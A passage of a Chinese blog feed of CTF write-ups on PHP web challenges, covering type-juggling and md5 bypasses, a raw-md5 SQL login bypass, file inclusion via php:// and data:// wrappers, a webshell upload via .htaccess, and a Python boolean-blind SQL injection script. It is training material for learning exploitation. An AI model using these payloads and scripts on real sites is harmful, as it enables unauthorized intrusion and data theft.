class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一看过滤了这么多，人都傻了。</p><p>system没法用，eval没法用，反正以字符串为参数的没法用了。变量传递，因为$被过滤也不能使用，麻了。</p><p>考察点：FilesystemIterator类的使用</p><p><img src="https://img-blog.csdnimg.cn/20201020151008173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eA==,size_16,color_FFFFFF,t_70#pic_center"></p><p>所以我们只需要再得到一个点或者路径就可以查看当前目录下的文件，得到一个/查看根目录下的文件。php中的getcwd()可以帮到我们这个忙。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>getcwd — 取得当前工作目录<span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token keyword type-declaration">void</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload为?v1=FilesystemIterator&amp;v2=getcwd</p><p>当然了，我们只能获得文件名。如果文件是php文件，我们可就没办法了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><p>绕过强类型对比之类的可以使用加空格的方式进行绕过，数字我们可以使用8进制，16进制。</p></li><li><p>双$的使用，比如$$a == &gt;$violet。也就是说$$a实际指的是变量名为变量a所指向的变量值。</p></li><li><p>遇到过滤我们想要得到的文件名时，可以使用路径获取。同时可以使用FilesystemIterator与getcwd结合获得文件名信息。（web110）</p></li><li><p>反射类的使用，我们可以使用反射类来输出类的详细信息。（web100）Reflection</p></li><li><p>hex2bin的使用。（web102,103）</p></li><li><p>hash的绕过。</p></li><li><p>ereg的绕过，可以使用%00截断。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含与命令执行</title>
      <link href="/2021/10/18/wen-jian-bao-han-yu-ming-ling-zhi-xing/"/>
      <url>/2021/10/18/wen-jian-bao-han-yu-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含与命令执行的总结</title>
      <link href="/2021/10/17/wen-jian-bao-han-yu-ming-ling-zhi-xing-de-zong-jie/"/>
      <url>/2021/10/17/wen-jian-bao-han-yu-ming-ling-zhi-xing-de-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含是什么？"><a href="#文件包含是什么？" class="headerlink" title="文件包含是什么？"></a>文件包含是什么？</h2><blockquote><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p></blockquote><h2 id="文件包含使用的函数。"><a href="#文件包含使用的函数。" class="headerlink" title="文件包含使用的函数。"></a>文件包含使用的函数。</h2><p>php中文件包含主要有以下四个方法。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="include与require的解释"><a href="#include与require的解释" class="headerlink" title="include与require的解释"></a>include与require的解释</h3><h2 id="本地的文件包含漏洞"><a href="#本地的文件包含漏洞" class="headerlink" title="本地的文件包含漏洞"></a>本地的文件包含漏洞</h2><p>测试源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="1.png"></p><p>我们就可以通过include进行目录遍历。</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>好文推荐</title>
      <link href="/2021/10/17/hao-wen-tui-jian/"/>
      <url>/2021/10/17/hao-wen-tui-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含、命令执行"><a href="#文件包含、命令执行" class="headerlink" title="文件包含、命令执行"></a>文件包含、命令执行</h2><p><a href="https://www.cxyzjd.com/article/qq_38154820/107171940">无参数读文件和RCE总结_合天网安学院-程序员宅基地</a></p><p>绝对好文、学到了很多新姿势。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>y4反序列化</title>
      <link href="/2021/10/15/y4-fan-xu-lie-hua/"/>
      <url>/2021/10/15/y4-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<?phperror_reporting(0);highlight_file(__FILE__);include("class.php");$action = $_GET['action'];include $action.".php";可以上传任意文件]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题日志1</title>
      <link href="/2021/10/15/buuctf-shua-ti-ri-zhi-1/"/>
      <url>/2021/10/15/buuctf-shua-ti-ri-zhi-1/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BuyFlag1"><a href="#极客大挑战-2019-BuyFlag1" class="headerlink" title="[极客大挑战 2019]BuyFlag1"></a>[极客大挑战 2019]BuyFlag1</h2><p><img src="1.png"></p><p>我们可以看到，想要得到flag需要有这几个要求。</p><p>然后，我们burpsuit抓包，可以看到cookie中有个user=0，猜测可能符合是student这个要求。所以，我们修改为1</p><p>之后，发送后我们可以看到源码为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"password can't be number&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Password Right!&lt;/br>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>password==404为弱类型对比，我们可以输入1234a来使其绕过is——numeric。</p><p>接下来就是付钱了，money=100000000。然而，长度过长报错，我们可以使用数组绕过，即money[]=10000000。</p><h2 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a>[BJDCTF2020]Easy MD51</h2><h3 id="md5的16位数"><a href="#md5的16位数" class="headerlink" title="md5的16位数"></a>md5的16位数</h3><p>进入页面，啥都没，随便输入也没啥反应。遇事不决，F12。可以看到，回复的报文有提示。</p><p><img src="3.png"></p><p>这个md5()方法又是个啥呢，查一查。</p><p><img src="4.png"></p><p>也就是说如果md5值经过hex转成字符串后为 ‘or’+balabala这样的字符串，则拼接后构成的SQL语句为：</p><p>sql语句就变成了</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">`</span>admin<span class="token punctuation">`</span> <span class="token keyword">where</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token operator">or</span><span class="token string">'balabala'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>or就构成了万能密码，所以我们就可以</p><blockquote><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。<br>    要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。<br>    当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>    当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p></blockquote><p>这挺好理解的，有点编程基础的都会知道。</p><p>下面是大佬的脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$c</span> <span class="token operator">&lt;</span> <span class="token number">1000000</span><span class="token punctuation">;</span> <span class="token variable">$c</span><span class="token operator">++</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\'or\''</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>   <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\nmd5(<span class="token interpolation"><span class="token variable">$i</span></span>) = "</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最常用的是ffifdyop，加密后 ‘or’6<trash></p><h3 id="md5的弱类型对比"><a href="#md5的弱类型对比" class="headerlink" title="md5的弱类型对比"></a>md5的弱类型对比</h3><p>进入新页面后，ctrl+u直接源码，很快昂，还有个小彩蛋。wow， violet wants a girlfriend</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// wow, glzjin wants a girl friend.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经典md5的相等问题，首先我们需要知道这是个弱类型的。== 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。</p><p>好的，那么那些数，md5加密后是以0e开头呢。</p><pre class="line-numbers language-none"><code class="language-none">ej0Dek06el08eo0ney0Mey0Oez0se006e10leU3ZeW3vfSoLfTohfTo1fUoUfYoufapFfbpffdpFfnpZfpprfqpafrpjfwpDfyp5f1p2f4pNf7pufDpQfHpPfIp4fJpXfLpvfOpifQp3fTpifVpzfeqNfjqNfvq1fyqyfAqJfEqkfFqgfFqifHqXfIqFfKqhfLq6fQq6fQqAfRqlfUq4fUqAfXq0fargfarJftrTf7rmfCrBfErYfIrtQNKCDZOs878926199as155964671as214587387as214587387as878926199a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>进入第三关后，我们可以看到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与上一题不同，这里是强类型对比。php有这些特性</p><blockquote><p>md5(array()) = null<br>    sha1(array()) = null<br>    ereg(pattern,array()) = null vs preg_match(pattern,array) = false<br>    strcmp(array(), “abc”) = null<br>    strpos(array(),”abc”) = null</p></blockquote><p>所以，我们直接传入param1[]=1&amp;param2[]=2即可</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>进入后发现源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">I</span> put something in <span class="token constant">F12</span> <span class="token keyword">for</span> you<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$gg</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'You got the first step'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token operator">==</span><span class="token number">1234567</span><span class="token punctuation">)</span>                 <span class="token punctuation">&#123;</span>                     <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Good Job!'</span><span class="token punctuation">;</span>                     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'By Retr_0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>                 <span class="token keyword">else</span>                 <span class="token punctuation">&#123;</span>                     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"can you think twice??"</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'You can not get it !'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'only one way to get the flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You are not a real hacker!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Please input first'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Please input first<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们看到(md5($id) === md5($gg) &amp;&amp; $id !== $gg，和上题类似。直接数组绕过，</p><p>然后，不能数字类型，弱类型对比。1234567a即可，没啥好说的。</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>好家伙，一进来就发现死人。很明显，文件上传嘛。</p><p>我测试的时候，上传正常的图片，也被口臭了。所以，我猜测可能为图片太大了。</p><p>上传.htaccess文件</p><p>修改文件类型为image/jpeg</p><p>然后上传一个，携带一句话的jpg文件。之后蚁剑连接，进入根目录即可。</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>输入1,2出结果。然后输入一些特殊字符出现boolen(false)很明显，布尔盲注。接下来检测过滤了，哪些字符函数。</p><p>首先，information、union、and、or、空格等。空格如何替代呢。/**/,括号，%a0。</p><p>然后我们输入1/1结果正常，很明显数字型。</p><p>而且从题意我们知道，我们所要查询的flag在flag表中flag里。脚本开写。</p><p>接下来就是写脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># select flag from flag limit 0,1</span>url <span class="token operator">=</span> <span class="token string">'http://d260f473-3477-41dd-a3c1-a610d76ac8b9.node4.buuoj.cn:81/'</span>sql <span class="token operator">=</span> <span class="token string">'select(flag)from(flag)'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    left <span class="token operator">=</span> <span class="token number">32</span>    right <span class="token operator">=</span> <span class="token number">130</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))>&#123;1&#125;)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span>payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># print(r.text)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'Hello'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            right <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//next.php</span>    </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里很明显使用文件包含漏洞，有file_get_contents方法。我们可以使用，data://plain/text,i have a dream进行绕过。当然也可以使用php://input但是，我这里不知道什么原因总是失败。而，next.php的内容可以使用php://filter伪协议进行获取。一套操作后，我们获得了它的源码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span 